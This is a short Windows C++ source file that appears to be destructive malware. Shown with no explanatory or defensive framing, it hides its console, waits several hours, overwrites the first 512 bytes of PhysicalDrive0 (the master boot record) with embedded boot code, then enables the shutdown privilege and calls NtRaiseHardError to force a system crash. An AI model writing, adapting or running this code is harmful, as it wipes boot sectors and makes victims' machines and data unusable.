#include <Windows.h>
#include <winternl.h>
#include "data.h"

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

int main() 
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	Sleep(10400000);
    int CALLBACK WinMain(
        HINSTANCE hInstance, HINSTANCE hPrevInstance,
        LPSTR     lpCmdLine, int       nCmdShow
    );
    {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);

        WriteFile(hDevice, bootcode, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }

    Sleep(300000);
    while(TRUE) 
    {
        BOOLEAN PrivilegeState = FALSE;
        ULONG ErrorResponse = 0;
        RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
        NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse); 
        return 0;
    }


}